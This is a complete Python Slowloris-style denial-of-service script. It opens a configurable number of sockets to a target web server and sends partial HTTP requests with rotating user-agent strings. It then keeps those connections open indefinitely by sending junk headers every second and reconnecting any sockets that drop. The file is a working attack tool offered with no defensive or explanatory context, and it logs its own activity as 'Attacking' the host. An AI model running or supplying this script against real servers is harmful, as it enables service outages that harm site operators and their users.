#!/usr/bin/env python3
import argparse
import logging
import random
import socket
import sys
from time import sleep  

parser = argparse.ArgumentParser()
parser.add_argument("host", nargs="?")
parser.add_argument("-p", "--port", default=80, type=int)
parser.add_argument("-s", "--sockets", default=150, type=int)
args = parser.parse_args()

# Set default sleeptime to 1 if not provided
if len(sys.argv) <= 1 or not args.host:
    parser.print_help()
    sys.exit(1)

args.sleeptime = 1  # Set default sleeptime to 1 second

logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)]
)

def send_line(sock, line):
    sock.send(f"{line}\r\n".encode("utf-8"))

def send_header(sock, name, value):
    send_line(sock, f"{name}: {value}")

user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1"
]

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

def init_socket(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(4)
    sock.connect((ip, args.port))
    send_line(sock, f"GET /?{random.randint(0, 2000)} HTTP/1.1")
    send_header(sock, "User-Agent", random.choice(user_agents))
    send_header(sock, "Accept-language", "en-US,en;q=0.5")
    return sock

logging.info(f"Attacking {args.host} with {args.sockets} sockets.")
ip = socket.gethostbyname(args.host)

list_of_sockets = []
for _ in range(args.sockets):
    try:
        sock = init_socket(ip)
    except socket.error:
        break
    list_of_sockets.append(sock)

while True:
    logging.info(f"Sending keep-alive headers... Socket count: {len(list_of_sockets)}")
    for sock in list(list_of_sockets):
        try:
            send_header(sock, "X-a", str(random.randint(1, 5000)))  # Converted to string
        except socket.error:
            list_of_sockets.remove(sock)
            try:
                sock = init_socket(ip)
                list_of_sockets.append(sock)
            except socket.error:
                continue
    sleep(args.sleeptime)